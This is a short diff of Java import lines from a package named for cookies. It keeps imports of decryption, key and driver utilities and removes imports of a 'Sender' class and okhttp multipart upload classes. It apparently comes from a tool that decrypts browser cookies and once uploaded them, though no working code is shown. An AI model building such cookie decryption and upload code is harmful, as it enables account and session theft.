@@ -3,14 +3,9 @@ package io.github.luxotick.impl.cookies;
 import com.google.gson.JsonArray;
 import com.google.gson.JsonElement;
 import com.google.gson.JsonObject;
-import io.github.luxotick.Sender;
 import io.github.luxotick.utils.DecryptUtil;
 import io.github.luxotick.utils.DriverUtil;
 import io.github.luxotick.utils.KeyUtil;
-import okhttp3.MediaType;
-import okhttp3.MultipartBody;
-import okhttp3.OkHttpClient;
-import okhttp3.RequestBody;
 
 import java.io.File;
 import java.nio.file.Files;
